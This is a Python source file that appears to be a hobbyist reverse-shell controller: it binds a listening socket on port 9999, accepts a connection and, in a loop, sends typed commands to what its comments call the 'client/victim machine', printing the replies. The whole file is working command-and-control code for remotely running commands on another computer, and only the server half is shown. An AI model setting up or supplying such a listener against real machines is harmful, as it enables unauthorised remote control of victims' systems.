import socket 
import sys 
 

# create a socket | to connect to computers 

def create_socket():
    try:
        global host
        global port 
        global s 

        host = ""           # as this file will be posted on the server and the host field is the ip addrs of the server itself
        port = 9999

        s = socket.socket()            # creating a socket
    except socket.error as msg:
        print("Socket creation error" + str(msg))

# binding the socket and host , and then listen for connections
        
def bind_socket():
    try:
        global host
        global port 
        global s

        print("binding the port"+str(port))

        s.bind((host,port))
        s.listen(5)                      # here the argument given is known as the backlog which is the threshold for the os to start refusing the connections

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "Retrying.......")
        bind_socket()


# Establish connection with a client and socket must be listening
        
def socket_accept():
    connection, address = s.accept()         # returns the object of the connection which can a lot usefull later, and next it gives a list of ip address and port 
    print("Connection has been established!! "+ address[0] + "binded to port: "+ str(address[1]))
    send_command(connection)
    connection.close()

# send commands to the client/victim machine
def send_command(connection):
    while True:                           # help us make it persistant and to be able to execute multiple commands b4 closing the connection
        cmd = input("Enter the command to execute else quit to exit: ")
        if cmd == 'quit':
            connection.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0 :
            connection.send(str.encode(cmd))
            client_response  = str(connection.recv(1024),'utf-8')
            print(client_response, end="")



def main():
    create_socket()
    bind_socket()
    socket_accept()





if __name__ == "__main__":
    main()


